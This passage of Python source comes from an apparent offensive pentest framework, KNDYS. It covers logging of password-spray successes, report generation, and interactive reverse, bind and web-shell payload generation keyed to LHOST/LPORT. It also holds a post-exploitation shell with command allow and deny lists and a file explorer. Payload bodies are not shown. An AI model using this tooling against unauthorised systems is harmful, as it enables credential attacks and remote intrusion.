            self.error_handler.handle_error(exc, "Exporting spray results")
            return []
        return [json_path, txt_path]

    def _audit_spray_success(self, profile, record):
        audit_path = profile['audit_log']
        if not audit_path or str(audit_path).lower() in {'none', 'off'}:
            return
        entry = {
            'timestamp': record.timestamp,
            'session': profile['session_id'],
            'service': record.service,
            'target': record.target,
            'username': record.username,
            'password_preview': record.password_preview
        }
        try:
            with open(audit_path, 'a', encoding='utf-8') as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError:
            pass
    
    # ============ TOOLS ============
    
    def run_report_generator(self):
        """Generate professional pentest report"""
        report_format = self.module_options.get('format', 'html')
        template = self.module_options.get('template', 'default')
        output = self.module_options.get('output', 'pentest_report')
        
        print(f"{Fore.CYAN}[*] Generating pentest report{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Format: {report_format}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Template: {template}{Style.RESET_ALL}\n")
        
        # Sample data for report
        findings = [
            {
                'title': 'SQL Injection Vulnerability',
                'severity': 'High',
                'description': 'SQL injection found in login form',
                'impact': 'Complete database compromise',
                'remediation': 'Use parameterized queries'
            },
            {
                'title': 'Weak Password Policy',
                'severity': 'Medium',
                'description': 'No password complexity requirements',
                'impact': 'Increased risk of account takeover',
                'remediation': 'Implement strong password policy'
            },
            {
                'title': 'Missing Security Headers',
                'severity': 'Low',
                'description': 'Missing X-Frame-Options and CSP headers',
                'impact': 'Increased risk of clickjacking',
                'remediation': 'Add security headers'
            }
        ]
        
        if report_format == 'html':
            # Generate HTML report
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - {datetime.now().strftime('%Y-%m-%d')}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .header {{ background-color: #2c3e50; color: white; padding: 20px; }}
        .finding {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; }}
        .high {{ border-left: 5px solid #e74c3c; }}
        .medium {{ border-left: 5px solid #f39c12; }}
        .low {{ border-left: 5px solid #3498db; }}
        .severity {{ font-weight: bold; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Penetration Test Report</h1>
        <p>Generated by KNDYS Framework on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <h2>Executive Summary</h2>
    <p>This report summarizes the findings from the penetration test conducted on the target systems.</p>
    
    <h2>Findings</h2>
"""
            
            for finding in findings:
                html_content += f"""
    <div class="finding {finding['severity'].lower()}">
        <h3>{finding['title']}</h3>
        <p class="severity">Severity: {finding['severity']}</p>
        <p><strong>Description:</strong> {finding['description']}</p>
        <p><strong>Impact:</strong> {finding['impact']}</p>
        <p><strong>Remediation:</strong> {finding['remediation']}</p>
    </div>
"""
            
            html_content += """
    <h2>Recommendations</h2>
    <ul>
        <li>Address all high severity findings immediately</li>
        <li>Implement regular security assessments</li>
        <li>Establish incident response procedures</li>
    </ul>
</body>
</html>
"""
            
            output_file = f"{output}.html"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"{Fore.GREEN}[+] HTML report generated: {output_file}{Style.RESET_ALL}")
        
        elif report_format == 'txt':
            # Generate text report
            txt_content = f"""
PENETRATION TEST REPORT
========================
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Tool: KNDYS Framework

FINDINGS
========
"""
            
            for finding in findings:
                txt_content += f"""
[{finding['severity'].upper()}] {finding['title']}
Description: {finding['description']}
Impact: {finding['impact']}
Remediation: {finding['remediation']}
"""
            
            output_file = f"{output}.txt"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(txt_content)
            
            print(f"{Fore.GREEN}[+] Text report generated: {output_file}{Style.RESET_ALL}")
        
        else:
            print(f"{Fore.RED}[!] Unsupported report format: {report_format}{Style.RESET_ALL}")
    
    # ============ UTILITY FUNCTIONS ============
    
    def show_help(self):
        """Display help"""
        self._render_screen_header("KNDYS Ops Manual", "stay ghosted. stay relentless.")

        sections = [
            ("Core Signals", [
                ("help", "display this manifest"),
                ("clear", "purge terminal noise"),
                ("exit / quit", "sever link to the deck")
            ]),
            ("Module Control", [
                ("show modules [cat]", "enumerate offensive stacks"),
                ("use <cat/module>", "load vector"),
                ("options", "inspect parameters"),
                ("set <opt> <val>", "program telemetry"),
                ("run", "execute current payload"),
                ("back", "drop module context")
            ]),
            ("Wordlist & Payload Arsenal", [
                ("show wordlists", "view curated dictionaries"),
                ("download wordlist <alias>", "pull from catalog"),
                ("show payloads", "list generators"),
                ("generate payload", "craft shellcode")
            ]),
            ("Global Config", [
                ("setg <opt> <val>", "mutate global vars"),
                ("stats", "runtime telemetry"),
                ("sessions", "active footholds")
            ])
        ]

        for title, commands in sections:
            print(f"{Fore.CYAN}{title.upper()}{Style.RESET_ALL}")
            for cmd, description in commands:
                print(f" {Fore.GREEN}{cmd:<26}{Fore.WHITE}:: {description}{Style.RESET_ALL}")
            print()

        domains = "recon | scan | exploit | post | password | wireless | social | network | webapp | report"
        print(f"{Fore.CYAN}PRIMARY DOMAINS{Style.RESET_ALL}")
        print(f" {Fore.WHITE}{domains}{Style.RESET_ALL}\n")

        recipes = [
            ("Port scan", "show modules recon → use recon/port_scanner → set target/ports → run"),
            ("Spray attack", "use password/spray_attack → set usernames/passwords → run"),
            ("Handler", "use exploit/multi_handler → set lhost/lport → run")
        ]
        print(f"{Fore.CYAN}FIELD RECIPES{Style.RESET_ALL}")
        for label, steps in recipes:
            print(f" ▸ {label}: {Fore.GREEN}{steps}{Style.RESET_ALL}")
        print()
    
    def search_exploits(self, query):
        """Search exploit database"""
        print(f"{Fore.CYAN}[*] Searching exploits for: {query}{Style.RESET_ALL}")
        
        results = self.exploit_db.search_exploits(query)
        
        if results:
            print(f"{Fore.GREEN}[+] Found {len(results)} exploits:{Style.RESET_ALL}")
            for exploit in results:
                print(f"\n{Fore.YELLOW}[{exploit['id']}] {exploit['name']}{Style.RESET_ALL}")
                print(f" Type: {exploit['type']}")
                print(f" Port: {exploit['port']}")
                print(f" Description: {exploit['description']}")
        else:
            print(f"{Fore.YELLOW}[*] No exploits found for: {query}{Style.RESET_ALL}")
    
    def show_payloads(self):
        """Show available payloads"""
        self._render_screen_header("Payload Foundry", "generator families for every foothold scenario")

        for category, payloads in self.payload_gen.payloads.items():
            header = f"{category.upper()} · {len(payloads)} variants"
            print(f"{Fore.CYAN}┌─[{header}]{Style.RESET_ALL}")
            for payload_type in payloads.keys():
                print(f"{Fore.WHITE}│ {Fore.GREEN}{payload_type:<20}{Fore.WHITE}ready{Style.RESET_ALL}")
            print(f"{Fore.CYAN}└{'─'*40}{Style.RESET_ALL}\n")
    
    def generate_payload(self):
        """Generate payload interactively"""
        print(f"{Fore.CYAN}[*] Payload Generator{Style.RESET_ALL}")
        
        payload_type = input(f"{Fore.YELLOW}Payload type (reverse_shell/bind_shell/web_shell): {Style.RESET_ALL}").strip()
        platform = input(f"{Fore.YELLOW}Platform (bash/python/php/powershell): {Style.RESET_ALL}").strip()
        
        if payload_type == 'reverse_shell':
            lhost = input(f"{Fore.YELLOW}LHOST [{self.config['lhost']}]: {Style.RESET_ALL}").strip() or self.config['lhost']
            lport = input(f"{Fore.YELLOW}LPORT [4444]: {Style.RESET_ALL}").strip() or '4444'
            
            payload = self.payload_gen.generate(payload_type, platform, LHOST=lhost, LPORT=lport)
            
        elif payload_type == 'bind_shell':
            lport = input(f"{Fore.YELLOW}LPORT [4444]: {Style.RESET_ALL}").strip() or '4444'
            payload = self.payload_gen.generate(payload_type, platform, LPORT=lport)
            
        else:
            payload = self.payload_gen.generate(payload_type, platform)

        if payload:
            print(f"\n{Fore.GREEN}[+] Generated payload:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}")

            # Save to file
            save = input(f"\n{Fore.YELLOW}Save to file? (y/n): {Style.RESET_ALL}").strip().lower()
            if save == 'y':
                filename = input(f"{Fore.YELLOW}Filename [payload.txt]: {Style.RESET_ALL}").strip() or 'payload.txt'
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(payload)
                print(f"{Fore.GREEN}[+] Payload saved to: {filename}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Failed to generate payload{Style.RESET_ALL}")
    
    # ============ POST-EXPLOITATION MODULES ============

    def _resolve_shell_profile(self):
        opts = self.module_options or {}
        session_id = (opts.get('session') or '1').strip() or '1'
        mode = (opts.get('mode') or 'interactive').strip().lower()
        if mode not in {'interactive', 'oneshot', 'batch'}:
            mode = 'interactive'
        timeout = self._safe_float(opts.get('timeout'), 10.0, 1.0, 60.0)
        throttle = self._safe_float(opts.get('throttle'), 0.0, 0.0, 2.0)
        history_limit = self._safe_int(opts.get('history_limit'), 50, 10, 500)
        capture_limit = self._safe_int(opts.get('history_capture'), 512, 64, 4096)
        record_transcript = self._parse_bool_option(opts.get('record_transcript', 'true'), True)
        transcript_path = (opts.get('transcript_path') or '').strip()
        if not transcript_path:
            safe_session = re.sub(r'[^a-zA-Z0-9_-]', '_', session_id)
            transcript_path = f"shell_session_{safe_session}.log"
        cwd_raw = (opts.get('cwd') or os.getcwd()).strip() or os.getcwd()
        if not os.path.isdir(cwd_raw):
            print(f"{Fore.YELLOW}[*] Working directory '{cwd_raw}' not accessible. Using current directory.{Style.RESET_ALL}")
            cwd_raw = os.getcwd()
        cwd = os.path.abspath(cwd_raw)
        allowlist = set(self.SHELL_DEFAULT_ALLOWLIST)
        for cmd in self._parse_list_option(opts.get('allow_commands', '')):
            allowlist.add(cmd)
        denylist = set(self.SHELL_BLOCKED_COMMANDS)
        for cmd in self._parse_list_option(opts.get('deny_commands', '')):
            denylist.add(cmd)
        allowlist.difference_update(denylist)
        env_map = self._build_env_map(opts.get('env', ''))
        commands_queue = []
        primary_cmd = (opts.get('command') or '').strip()
        if mode in {'oneshot', 'batch'} and primary_cmd:
            commands_queue.append(primary_cmd)
        if mode == 'batch':
            batch_blob = (opts.get('commands') or '').replace('|||', '\n')
            for line in batch_blob.splitlines():
                entry = line.strip()
                if entry:
                    commands_queue.append(entry)
        return {
            'session_id': session_id,
            'mode': mode,
            'timeout': timeout,
            'throttle': throttle,
            'history_limit': history_limit,
            'capture_limit': capture_limit,
            'record_transcript': record_transcript,
            'transcript_path': transcript_path,
            'cwd': cwd,
            'allowlist': allowlist,
            'denylist': denylist,
            'env': env_map,
            'commands_queue': commands_queue,
            '_transcript_error': False
        }

    def _ensure_shell_session(self, session_id, history_limit):
        session_data = self.session_manager.get_session(session_id)
        if not session_data:
            session_data = {'commands': []}
            self.session_manager.create_session(session_id, session_data)
        history = session_data.get('commands') or []
        if not isinstance(history, list):
            history = list(history)
            session_data['commands'] = history
        if len(history) > history_limit:
            del history[:-history_limit]
        return session_data

    def _handle_internal_shell_command(self, internal_cmd, session_id, session_data):
        history = session_data.get('commands') or []
        if internal_cmd == 'history':
            if not history:
                print(f"{Fore.YELLOW}[*] No history recorded{Style.RESET_ALL}")
                return True
            print(f"{Fore.CYAN}[*] Recent command history{Style.RESET_ALL}")
            start_index = max(0, len(history) - 10)
            for idx, entry in enumerate(history[start_index:], start=start_index + 1):
                status = 'OK' if entry.get('success') else 'ERR'
                color = Fore.GREEN if entry.get('success') else Fore.RED
                duration = entry.get('duration', 0.0)
                print(f" {idx:02d} {color}[{status}]{Style.RESET_ALL} {entry.get('cmd')} ({duration:.2f}s)")
            return True
        if internal_cmd == 'stats':
            total = len(history)
            if not total:
                print(f"{Fore.YELLOW}[*] No statistics available yet{Style.RESET_ALL}")
                return True
            success = sum(1 for entry in history if entry.get('success'))
            failure = total - success
            avg_duration = sum(entry.get('duration', 0.0) for entry in history) / total
            print(f"{Fore.CYAN}[*] Shell command stats{Style.RESET_ALL}")
            print(f" Total: {total} | Success: {success} | Failure: {failure} | Avg runtime: {avg_duration:.2f}s")
            return True
        if internal_cmd == 'last':
            if not history:
                print(f"{Fore.YELLOW}[*] No commands executed yet{Style.RESET_ALL}")
                return True
            entry = history[-1]
            status = 'OK' if entry.get('success') else 'ERR'
            print(f"{Fore.CYAN}[*] Last command [{status}]{Style.RESET_ALL} {entry.get('cmd')}")
            if entry.get('stdout'):
                print(entry['stdout'])
            if entry.get('stderr'):
                print(f"{Fore.RED}{entry['stderr']}{Style.RESET_ALL}")
            return True
        if internal_cmd == 'clear_history':
            history.clear()
            self.session_manager.update_session(session_id, {'commands': history})
            print(f"{Fore.GREEN}[+] Shell history cleared{Style.RESET_ALL}")
            return True
        return False

    def _append_shell_history(self, session_id, session_data, profile, record):
        history = session_data.setdefault('commands', [])
        history.append(record.to_history_entry(profile['capture_limit']))
        if len(history) > profile['history_limit']:
            del history[:-profile['history_limit']]
        self.session_manager.update_session(session_id, {'commands': history})

    def _record_shell_transcript(self, profile, record):
        if not profile['record_transcript'] or profile.get('_transcript_error'):
            return
        try:
            timestamp = self._utc_timestamp()
            with open(profile['transcript_path'], 'a', encoding='utf-8') as fh:
                fh.write(f"[{timestamp}] $ {record.cmd}\n")
                if record.stdout:
                    stdout_payload = record.stdout
                    fh.write(stdout_payload if stdout_payload.endswith('\n') else stdout_payload + '\n')
                if record.stderr:
                    stderr_payload = record.stderr
                    prefix = '[stderr] '
                    payload = stderr_payload if stderr_payload.endswith('\n') else stderr_payload + '\n'
                    fh.write(prefix + payload)
        except Exception as exc:
            self.error_handler.handle_error(exc, "Writing shell transcript")
            profile['_transcript_error'] = True

    def _build_shell_environment(self, extra_env):
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        return env

    def _execute_shell_command(self, session_id, session_data, profile, command):
        sanitized = self.validator.sanitize_command(command)
        if not sanitized:
            print(f"{Fore.RED}[!] Command contains dangerous characters{Style.RESET_ALL}")
            return None
        try:
            parts = shlex.split(sanitized)
        except ValueError as exc:
            print(f"{Fore.RED}[!] Unable to parse command: {exc}{Style.RESET_ALL}")
            return None
        if not parts:
            return None
        base_cmd = parts[0]
        if base_cmd in self.SHELL_INTERNAL_COMMANDS:
            self._handle_internal_shell_command(base_cmd, session_id, session_data)
            return None
        if base_cmd in profile['denylist'] or base_cmd not in profile['allowlist']:
            allowed_preview = ', '.join(sorted(profile['allowlist'])[:8])
            print(f"{Fore.RED}[!] Command '{base_cmd}' not permitted{Style.RESET_ALL}")
            if allowed_preview:
                print(f"{Fore.BLUE}ℹ Allowed commands include: {allowed_preview}...{Style.RESET_ALL}")
            return None
        env = self._build_shell_environment(profile['env'])
        start = time.time()
        try:
            result = subprocess.run(
                parts,
                capture_output=True,
                text=True,
                timeout=profile['timeout'],
                cwd=profile['cwd'],
                env=env,
                shell=False
            )
            duration = time.time() - start
            stdout_text = result.stdout or ''
            stderr_text = result.stderr or ''
            if stdout_text:
                print(stdout_text, end='' if stdout_text.endswith('\n') else '\n')
            if stderr_text:
                print(f"{Fore.RED}{stderr_text}{Style.RESET_ALL}", end='' if stderr_text.endswith('\n') else '\n')
            record = ShellCommandRecord(
                cmd=sanitized,
                timestamp=start,
                duration=duration,
                exit_code=result.returncode,
                stdout=stdout_text,
                stderr=stderr_text
            )
        except subprocess.TimeoutExpired:
            duration = profile['timeout']
            print(f"{Fore.RED}[!] Command timeout ({profile['timeout']}s limit){Style.RESET_ALL}")
            record = ShellCommandRecord(
                cmd=sanitized,
                timestamp=start,
                duration=duration,
                exit_code=-1,
                stdout='',
                stderr=f"Timeout after {profile['timeout']}s"
            )
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Command not found: {base_cmd}{Style.RESET_ALL}")
            record = ShellCommandRecord(
                cmd=sanitized,
                timestamp=start,
                duration=0.0,
                exit_code=-1,
                stdout='',
                stderr='Command not found'
            )
        except Exception as exc:
            self.error_handler.handle_error(exc, f"Executing command: {sanitized}")
            return None
        self._append_shell_history(session_id, session_data, profile, record)
        self._record_shell_transcript(profile, record)
        return record

    def _display_shell_summary(self, profile, records):
        total = len(records)
        successes = sum(1 for record in records if record.success)
        failures = total - successes
        total_runtime = sum(record.duration for record in records)
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SHELL SESSION SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{profile['session_id']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Working directory : {Fore.CYAN}{profile['cwd']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Commands executed : {Fore.CYAN}{total}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Successes : {Fore.GREEN}{successes}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Failures : {Fore.YELLOW}{failures}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Total runtime : {Fore.CYAN}{total_runtime:.2f}s{Style.RESET_ALL}")
        if profile['record_transcript']:
            print(f"{Fore.WHITE} Transcript : {Fore.CYAN}{profile['transcript_path']}{Style.RESET_ALL}")
        if records:
            print(f"\n{Fore.GREEN}[+] Recent commands{Style.RESET_ALL}")
            for record in records[-3:]:
                status = 'OK' if record.success else 'ERR'
                color = Fore.GREEN if record.success else Fore.RED
                print(f" {color}[{status}]{Style.RESET_ALL} {record.cmd} ({record.duration:.2f}s)")
        return {
            'session_id': profile['session_id'],
            'mode': profile['mode'],
            'commands_executed': total,
            'successes': successes,
            'failures': failures,
            'total_runtime': round(total_runtime, 4),
            'transcript_path': profile['transcript_path'] if profile['record_transcript'] else None
        }

    def run_shell(self):
        """Adaptive secure shell controller"""
        profile = self._resolve_shell_profile()
        session_id = profile['session_id']
        print(f"{Fore.CYAN}[*] Opening shell session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Mode: {profile['mode']} | Timeout: {profile['timeout']}s | CWD: {profile['cwd']}{Style.RESET_ALL}")
        allowed_preview = ', '.join(sorted(profile['allowlist'])[:8])
        if allowed_preview:
            print(f"{Fore.BLUE}ℹ Allowed commands include: {allowed_preview}...{Style.RESET_ALL}")
        print(f"{Fore.BLUE}ℹ Built-in commands: history, stats, last, clear_history{Style.RESET_ALL}\n")
        session_data = self._ensure_shell_session(session_id, profile['history_limit'])
        executed_records = []
        summary = None
        try:
            if profile['mode'] in {'oneshot', 'batch'}:
                if profile['commands_queue']:
                    print(f"{Fore.CYAN}[*] Executing {len(profile['commands_queue'])} queued command(s){Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[*] No commands queued for non-interactive shell{Style.RESET_ALL}")
                for queued_command in profile['commands_queue']:
                    record = self._execute_shell_command(session_id, session_data, profile, queued_command)
                    if record:
                        executed_records.append(record)
                    if profile['throttle'] > 0:
                        time.sleep(profile['throttle'])
                summary = self._display_shell_summary(profile, executed_records)
            else:
                print(f"{Fore.YELLOW}[*] Type 'exit' or 'quit' to close shell{Style.RESET_ALL}")
                while True:
                    try:
                        cmd = input(f"{Fore.CYAN}shell@session{session_id}>{Style.RESET_ALL} ").strip()
                    except KeyboardInterrupt:
                        print(f"\n{Fore.YELLOW}[*] Interrupted{Style.RESET_ALL}")
                        break
                    if not cmd:
                        continue
                    if cmd.lower() in {'exit', 'quit'}:
                        break
                    record = self._execute_shell_command(session_id, session_data, profile, cmd)
                    if record:
                        executed_records.append(record)
                    if profile['throttle'] > 0:
                        time.sleep(profile['throttle'])
                summary = self._display_shell_summary(profile, executed_records)
        finally:
            self.session_manager.close_session(session_id)
            print(f"{Fore.YELLOW}[*] Shell session closed{Style.RESET_ALL}")
        return summary

    def _resolve_file_explorer_profile(self):
        opts = self.module_options or {}
        session_id = (opts.get('session') or '1').strip() or '1'
        root_raw = (opts.get('root') or '/').strip() or '/'
        root = os.path.realpath(os.path.abspath(os.path.expanduser(root_raw)))
        if not os.path.isdir(root):
            print(f"{Fore.RED}[!] Explorer root does not exist: {root_raw}{Style.RESET_ALL}")
            return None
        allow_outside = self._parse_bool_option(opts.get('allow_outside_root', 'false'), False)
        path_raw = (opts.get('path') or root).strip() or root
        try:
            target_path = self._safe_explorer_path(path_raw, root, allow_outside)
        except ValueError as exc:
            print(f"{Fore.RED}[!] {exc}{Style.RESET_ALL}")
            return None
        mode = (opts.get('mode') or 'list').strip().lower()
        if mode not in {'list', 'recursive', 'search'}:
            mode = 'list'
        max_depth = self._safe_int(opts.get('max_depth'), 2, 0, 10)
        max_entries = self._safe_int(opts.get('max_entries'), 200, 1, 5000)
        include_hidden = self._parse_bool_option(opts.get('include_hidden', 'false'), False)
        pattern = (opts.get('pattern') or '').strip()
        pattern_mode = (opts.get('pattern_mode') or 'glob').strip().lower()
        if pattern_mode not in {'glob', 'regex', 'contains'}:
            pattern_mode = 'glob'
        pattern_compiled = None
        if pattern and pattern_mode == 'regex':
            try:
                pattern_compiled = re.compile(pattern)
            except re.error as exc:
                print(f"{Fore.YELLOW}[*] Invalid regex pattern '{pattern}': {exc}. Ignoring filter.{Style.RESET_ALL}")
                pattern = ''
        file_types_raw = (opts.get('file_types') or 'all').lower().split(',')
        file_types = {token.strip() for token in file_types_raw if token.strip()}
        if not file_types:
            file_types = {'all'}
        type_aliases = {
            'files': 'file',
            'file': 'file',
            'directories': 'dir',
            'dirs': 'dir',
            'folders': 'dir',
            'folder': 'dir',
            'links': 'other',
            'symlinks': 'other'
        }
        normalized_types = set()
        for token in file_types:
            normalized_types.add(type_aliases.get(token, token))
        file_types = normalized_types
        min_size = self._parse_size_option(opts.get('min_size'), 0)
        max_size = self._parse_size_option(opts.get('max_size'), 0)
        if max_size and max_size < min_size:
            max_size = 0
        sort_by = (opts.get('sort_by') or 'name').strip().lower()
        if sort_by not in {'name', 'size', 'modified', 'type'}:
            sort_by = 'name'
        sort_order = (opts.get('sort_order') or 'asc').strip().lower()
        if sort_order not in {'asc', 'desc'}:
            sort_order = 'asc'
        hash_files = self._parse_bool_option(opts.get('hash_files', 'false'), False)
        hash_limit = self._parse_size_option(opts.get('hash_limit'), 65536)
        preview = self._parse_bool_option(opts.get('preview', 'false'), False)
        preview_bytes = self._safe_int(opts.get('preview_bytes'), 512, 64, 4096)
        follow_links = self._parse_bool_option(opts.get('follow_links', 'false'), False)
        worker_threads = self._safe_int(opts.get('worker_threads'), 4, 1, 16)
        cache_ttl = self._safe_float(opts.get('cache_ttl'), 5.0, 0.0, 300.0)
        export_prefix = (opts.get('export_prefix') or 'file_explorer').strip() or 'file_explorer'
        profile = {
            'session_id': session_id,
            'root': root,
            'path': target_path,
            'mode': mode,
            'max_depth': max_depth,
            'max_entries': max_entries,
            'include_hidden': include_hidden,
            'pattern': pattern,
            'pattern_mode': pattern_mode,
            'pattern_compiled': pattern_compiled,
            'file_types': file_types,
            'min_size': min_size,
            'max_size': max_size,
            'sort_by': sort_by,
            'sort_order': sort_order,
            'hash_files': hash_files,
            'hash_limit': hash_limit,
            'preview': preview,
            'preview_bytes': preview_bytes,
            'follow_links': follow_links,
            'worker_threads': worker_threads,
            'cache_ttl': cache_ttl,
            'export_prefix': export_prefix,
            'allow_outside_root': allow_outside,
            'requested_path': path_raw
        }
        return profile

    def _safe_explorer_path(self, requested_path, root, allow_outside):
        candidate = os.path.expanduser(requested_path)
        if not os.path.isabs(candidate):
            candidate = os.path.join(root, candidate)
        candidate_real = os.path.realpath(candidate)
        root_real = os.path.realpath(root)
        if not allow_outside and not candidate_real.startswith(root_real):
            raise ValueError("Requested path escapes allowed root boundary")
        return candidate_real

    def _build_file_explorer_cache_key(self, profile):
        key_fields = [
            profile['path'], profile['mode'], profile['max_depth'], profile['max_entries'],
            profile['include_hidden'], profile['pattern'], profile['pattern_mode'],
            ','.join(sorted(profile['file_types'])), profile['min_size'], profile['max_size'],
            profile['hash_files'], profile['preview'], profile['sort_by'], profile['sort_order']
        ]
        digest = hashlib.sha256('|'.join(map(str, key_fields)).encode('utf-8')).hexdigest()
        return digest

    def _get_cached_file_explorer_result(self, cache_key, ttl):
        if ttl <= 0:
            return None
        now = time.time()
        with self._explorer_cache_lock:
            entry = self._explorer_cache.get(cache_key)
            if not entry:
                return None
            if now - entry['timestamp'] > ttl:
                self._explorer_cache.pop(cache_key, None)
                return None
            return entry['data']

    def _store_file_explorer_cache(self, cache_key, data):
        with self._explorer_cache_lock:
            self._explorer_cache[cache_key] = {'timestamp': time.time(), 'data': data}
            while len(self._explorer_cache) > 8:
                self._explorer_cache.popitem(last=False)

    def _execute_file_explorer(self, profile):
        base_path = profile['path']
        if not os.path.exists(base_path):
            summary = ExplorerSummary(
                base_path=base_path,
                total_entries=0,
                files=0,
                directories=0,
                other=0,
                total_size=0,
                depth_reached=0,
                truncated=False,
                errors=1
            )
            return {'entries': [], 'errors': [f"Path not found: {base_path}"], 'summary': summary, 'truncated': False}
        raw_entries = []
        errors = []
        truncated = False
        if os.path.isfile(base_path):
            try:
                stat_result = os.stat(base_path, follow_symlinks=profile['follow_links'])
            except PermissionError:
                errors.append(f"Permission denied: {base_path}")
            except OSError as exc:
                errors.append(f"{base_path}: {exc}")
            else:
                raw_entries.append({
                    'name': os.path.basename(base_path),
                    'path': base_path,
                    'type': 'file',
                    'depth': 0,
                    'stat': stat_result
                })
        else:
            raw_entries, errors, truncated = self._scan_directory(profile)
        entries = self._materialize_explorer_entries(raw_entries, profile)
        summary = self._summarize_explorer_entries(entries, profile, errors, truncated)
        return {
            'entries': entries,
            'errors': errors,
            'summary': summary,
            'truncated': truncated
        }

    def _scan_directory(self, profile):
        queue = deque([(profile['path'], 0)])
        raw_entries = []
        errors = []
        root_real = os.path.realpath(profile['root'])
        while queue and len(raw_entries) < profile['max_entries']:
            current_path, depth = queue.popleft()
            try:
                with os.scandir(current_path) as iterator:
                    for entry in iterator:
                        if len(raw_entries) >= profile['max_entries']:
                            break
                        name = entry.name
                        if not profile['include_hidden'] and name.startswith('.'):
                            continue
                        try:
                            entry_path = entry.path
                        except OSError:
                            continue
                        entry_real = os.path.realpath(entry_path)
                        if not profile['allow_outside_root'] and not entry_real.startswith(root_real):
                            continue
                        is_dir = entry.is_dir(follow_symlinks=profile['follow_links'])
                        is_file = entry.is_file(follow_symlinks=profile['follow_links'])
                        entry_type = 'dir' if is_dir else 'file' if is_file else 'other'
                        try:
                            stat_result = entry.stat(follow_symlinks=profile['follow_links'])
                        except (PermissionError, FileNotFoundError) as exc:
                            errors.append(f"{entry_path}: {exc}")
                            continue
                        candidate = {
                            'name': name,
                            'path': entry_path,
                            'type': entry_type,
                            'depth': depth + 1,
                            'stat': stat_result
                        }
                        if self._should_include_entry(candidate, profile):
                            raw_entries.append(candidate)
                        if entry_type == 'dir' and depth < profile['max_depth'] and profile['mode'] != 'list':
                            queue.append((entry_path, depth + 1))
            except PermissionError:
                errors.append(f"Permission denied: {current_path}")
            except FileNotFoundError:
                errors.append(f"Path not accessible: {current_path}")
            except OSError as exc:
                errors.append(f"{current_path}: {exc}")
        truncated = len(raw_entries) >= profile['max_entries']
        return raw_entries, errors, truncated

    def _should_include_entry(self, candidate, profile):
        entry_type = candidate['type']
        if 'all' not in profile['file_types'] and entry_type not in profile['file_types']:
            return False
        stat_result = candidate['stat']
        size = getattr(stat_result, 'st_size', 0)
        if size < profile['min_size']:
            return False
        if profile['max_size'] and size > profile['max_size']:
            return False
        pattern = profile['pattern']
        if pattern:
            name = candidate['name']
            if profile['pattern_mode'] == 'glob':
                if not fnmatch.fnmatch(name, pattern):
                    return False
            elif profile['pattern_mode'] == 'regex':
                if not profile['pattern_compiled'] or not profile['pattern_compiled'].search(name):
                    return False
            else:
                if pattern.lower() not in name.lower():
                    return False
        return True

    def _materialize_explorer_entries(self, raw_entries, profile):
        entries = []
        if not raw_entries:
            return entries
        worker_count = profile['worker_threads'] if len(raw_entries) > 4 else 1
        if worker_count > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=worker_count) as executor:
                futures = [executor.submit(self._build_explorer_entry, raw, profile) for raw in raw_entries]
                for future in concurrent.futures.as_completed(futures):
                    entry = future.result()
                    if entry:
                        entries.append(entry)
        else:
            for raw in raw_entries:
                entry = self._build_explorer_entry(raw, profile)
                if entry:
                    entries.append(entry)
        reverse = profile['sort_order'] == 'desc'
        entries.sort(key=lambda item: self._explorer_sort_key(item, profile), reverse=reverse)
        return entries

    def _build_explorer_entry(self, raw, profile):
        stat_result = raw['stat']
        permissions = stat.filemode(stat_result.st_mode)
        owner = self._resolve_username(stat_result.st_uid)
        group = self._resolve_groupname(stat_result.st_gid)
        entry_hash = None
        preview = None
        if profile['hash_files'] and raw['type'] == 'file':
            entry_hash = self._hash_file_sample(raw['path'], profile['hash_limit'])
        if profile['preview'] and raw['type'] == 'file' and stat_result.st_size <= profile['preview_bytes']:
            preview = self._preview_file(raw['path'], profile['preview_bytes'])
        return ExplorerEntry(
            name=raw['name'],
            path=os.path.realpath(raw['path']),
            type=raw['type'],
            size=getattr(stat_result, 'st_size', 0),
            modified=getattr(stat_result, 'st_mtime', 0.0),
            permissions=permissions,
            owner=owner,
            group=group,
            depth=raw['depth'],
            hash=entry_hash,
            preview=preview
        )

    def _explorer_sort_key(self, entry, profile):
        if profile['sort_by'] == 'size':
            return entry.size
        if profile['sort_by'] == 'modified':
            return entry.modified
        if profile['sort_by'] == 'type':
            return entry.type
        return entry.name.lower()

    def _hash_file_sample(self, path, byte_limit):
        try:
            hasher = hashlib.sha256()
            read_limit = max(0, int(byte_limit))
            with open(path, 'rb') as fh:
                if read_limit == 0:
                    for chunk in iter(lambda: fh.read(65536), b''):
                        hasher.update(chunk)
                else:
                    remaining = read_limit
                    while remaining > 0:
                        chunk = fh.read(min(65536, remaining))
                        if not chunk:
                            break
                        hasher.update(chunk)
                        remaining -= len(chunk)
            return hasher.hexdigest()
